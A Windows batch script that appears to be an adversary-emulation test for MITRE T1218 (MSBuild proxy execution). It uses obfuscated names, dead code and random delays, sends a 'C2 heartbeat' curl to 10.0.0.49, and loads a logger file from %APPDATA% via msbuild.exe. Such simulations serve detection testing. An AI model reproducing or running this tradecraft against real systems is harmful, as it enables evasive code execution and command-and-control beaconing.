@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals)
SET txisnba=%APPDATA%\8652\a1814d10
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8652-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=visio.txt
SET dvhhyc=8652

REM Random variables for script logic
SET zxmqp=!mdvfmsbx!
SET ypohgq=%APPDATA%\!rrocubc!
SET lolbin=msbuild.exe
SET state=0
SET result=1
SET err=

REM Start with random delay
SET /A rnd=!RANDOM! %% 30 + 30
timeout /t !rnd! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay=!rnd!s>> "!ypohgq!\macula-simulations.log" 2>nul

GOTO qwzxc

:akjdh
REM Dead code block 1
SET junk=never_used
GOTO END

:qwzxc
REM State machine dispatcher
IF !state!==0 GOTO mnbvf
IF !state!==1 GOTO plkmj
IF !state!==2 GOTO tyuio
IF !state!==9 GOTO END

:mnbvf
REM C2 heartbeat (mandatory first operation)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!ypohgq!\macula-simulations.log" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!ypohgq!\macula-simulations.log" 2>nul
ping -n 7 127.0.0.1 >nul
SET state=1
GOTO qwzxc

:bnvcxz
REM Dead code block 2
GOTO END

:plkmj
REM Prepare environment
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: dir_change_start>> "!ypohgq!\macula-simulations.log" 2>nul
cd /d "!txisnba!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: dir_change_result=!errorlevel!>> "!ypohgq!\macula-simulations.log" 2>nul
SET /A delay=!RANDOM! %% 15 + 5
CHOICE /C Y /N /D Y /T !delay! >nul
SET state=2
GOTO qwzxc

:lkjhgf
REM Dead code block 3
SET fake=dead_end

:tyuio
REM Execute T1218 via msbuild
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: msbuild_execute_start>> "!ypohgq!\macula-simulations.log" 2>nul
!lolbin! /logger:LoggerEntry,"!txisnba!\\!xzanpex!";MyParameters,Foo >nul 2>&1
IF NOT !ERRORLEVEL!==0 (
    SET result=0
    SET err=build_failed
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: msbuild_exit_code=!ERRORLEVEL!>> "!ypohgq!\macula-simulations.log" 2>nul
timeout /t 12 /nobreak >nul
SET state=9
GOTO qwzxc

:poiuyt
REM Dead code block 4
GOTO END

:asdfgh
REM Never reached state
SET trap=bypassed

:END
REM TTP logging
SET ttp_id=T1218
SET ttp_name=MSBuild
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-!ttp_id!|!ttp_name!=!result!:!err!>> "!ypohgq!\macula-simulations.log" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_complete>> "!ypohgq!\macula-simulations.log" 2>nul